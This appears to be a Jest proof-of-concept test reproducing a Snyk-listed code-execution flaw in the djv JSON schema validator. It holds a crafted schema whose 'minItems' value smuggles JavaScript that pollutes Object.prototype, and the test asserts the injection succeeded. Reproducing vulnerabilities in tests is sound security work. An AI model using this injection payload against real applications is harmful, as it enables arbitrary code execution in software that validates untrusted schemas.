//https://security.snyk.io/vuln/SNYK-JS-DJV-1014545
test("Arbitrary code execution in  djv", () => {
  const djv = require("djv");
  expect({}.polluted).toBe(undefined);

  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}'
    );
    env.addSchema("test", evilSchema);
    env.validate("test#/common", { type: "custom" });
  } catch (error) {
    //console.log(error);
  }

  expect({}.polluted).toBe("yes");
});
